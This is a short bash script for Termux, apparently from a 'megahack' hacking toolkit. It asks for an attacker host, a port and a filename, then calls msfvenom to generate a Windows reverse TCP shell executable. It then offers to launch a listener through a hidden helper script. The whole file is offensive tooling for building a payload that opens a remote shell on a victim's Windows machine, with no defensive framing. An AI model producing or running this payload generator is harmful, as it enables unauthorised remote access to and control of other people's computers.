#!/data/data/com.termux/files/usr/bin/bash
cd $HOME/megahack
rm -rf .d.rc
clear
figlet Windows | lolcat -t
figlet Payload | lolcat -t
tput setaf 1; echo "LHOST"
read lhost
tput setaf 2; echo "LPORT"
read lport
tput setaf 3; echo "Set Filename "
read file
msfvenom -p windows/shell/reverse_tcp lhost="$lhost" lport="$lport" -f exe > $HOME/megahack/output/windows/"$file".exe && tput setaf 2; echo "PAYLOAD GENERATED SUCCESSFULLY" && tput setaf 3; echo "PRESS INTER TO CONTINUE"
read nov
clear
figlet Windows | lolcat -t
figlet Payload | lolcat -t
echo " "
tput setaf 3; echo "  [1] Start Listner"
echo " "
tput setaf 2; echo "  [2] Exit"
echo " " 
read task
if [ "1" = "$task" ]
then
	cd && cd megahack/.l && bash .2.sh
else
	exit
fi
